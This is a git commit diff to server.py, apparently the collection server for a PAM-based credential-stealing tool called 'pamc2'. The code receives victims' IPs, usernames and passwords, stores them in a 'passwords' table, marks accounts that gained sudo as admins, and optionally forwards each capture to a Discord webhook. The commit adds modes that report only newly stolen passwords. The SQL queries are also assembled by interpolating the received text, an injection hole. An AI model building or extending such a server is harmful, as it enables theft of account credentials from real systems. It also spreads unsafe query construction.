d83bb5eb3aa22eea039de7d2f786342cdc4b4321
max-49 <massimomarino49@gmail.com>
2025-02-28 13:37:03 -0500

    finish --no-db and --only-new implementations to server

--- server.py
+++ server.py
@@ -9,10 +9,10 @@ from dotenv import load_dotenv
 def server_args():
     parser = argparse.ArgumentParser(description="Server meant for use with pamc2")
     parser.add_argument('-p', '--port', metavar="<LISTENING PORT>", help="Port number to listen on (default 5000)", 
-                        type="int", dest="port", action="store", default="5000")
-    parser.add_argument('--discord', help="Enable Discord Webhook (set WEBHOOK_URL env var)")
-    parser.add_argument('--minimal', help="Only print updates")
-    parser.add_argument('--nodb', help="Run the server without utilizing the database")
+                        type=int, dest="port", action="store", default="5000")
+    parser.add_argument('--discord', action="store_true", help="Enable Discord Webhook (set WEBHOOK_URL env var)")
+    parser.add_argument('--no-db', dest="nodb", action="store_true", help="Run the server without utilizing the database (cannot be used with --only-new)")
+    parser.add_argument('--only-new', dest="onlynew", action="store_true", help="Only output new information (cannot be used with --no-db)")
     return parser.parse_args()
 
 def send_discord(addr, data):
@@ -59,6 +59,7 @@ def write_db(addr, data):
 
     userexists = [x for x in user_in_table]
 
+    retval = 0
     if (message_type == 1): # authenticated/chpasswd
         
         if (len(userexists) == 0):
@@ -66,6 +67,7 @@ def write_db(addr, data):
             INSERT INTO passwords(ip, username, password)
             VALUES ('{ip}', '{username}', '{password}');
             ''')
+            retval = 1
 
         elif (userexists[0][0] != password):
             cursor.execute(f'''
@@ -73,9 +75,14 @@ def write_db(addr, data):
             SET password = '{password}'
             WHERE username = '{username}';
             ''')
+            retval = 1
+
+        elif (userexists[0][0] == password):
+            retval = 0
 
         else:
-            print("unknown error adding authenticated user to databse")
+            print("unknown error adding authenticated user to database")
+            retval = -1
     
     elif (message_type == 2): # sudo
 
@@ -86,23 +93,34 @@ def write_db(addr, data):
                 SET known_admin = 1
                 WHERE username = '{username}';
                 ''')
+                retval = 1
         else:
-            print("no clue how you got here")
+            print("no clue how you got here (user got root without authenticating)")
+            retval = -1
 
     else:
         print("Unknown Error adding user to database")
+        retval = -1
 
     conn.commit()
     conn.close()
 
+    return retval
+
 def handle_client(lock, c, addr, cmd_args):
     data = c.recv(1024).decode()
-    print(f"Received from {addr} - {data}")
+
+    if (not cmd_args.onlynew):
+        print(f"Received from {addr} - {data}")
 
     lock.acquire()
 
+    retval = 0
     if (not cmd_args.nodb):
-        write_db(addr, data)
+        retval = write_db(addr, data)
+    
+    if (cmd_args.onlynew and retval == 1):
+        print(f"Received from {addr} - {data}")
 
     if (cmd_args.discord):
         send_discord(addr, data)
@@ -116,7 +134,11 @@ def main():
     cmd_args = server_args()
 
     if (cmd_args.discord and not os.getenv("WEBHOOK_URL")):
-        print("You must set a WEBHOOK_URL environment variable to use --discord! Please either create a .env file with the WEBHOOK_URL or set the environment variable globally to use this setting.")
+        print("FATAL ERROR: You must set a WEBHOOK_URL environment variable to use --discord! Please either create a .env file with the WEBHOOK_URL or set the environment variable globally to use this setting.")
+        exit(1)
+
+    if (cmd_args.nodb and cmd_args.onlynew):
+        print("FATAL ERROR: You cannot run no-db and only-new mode at the same time! Database checking is required for checking if request is new!")
         exit(1)
 
     server_socket = socket.socket()
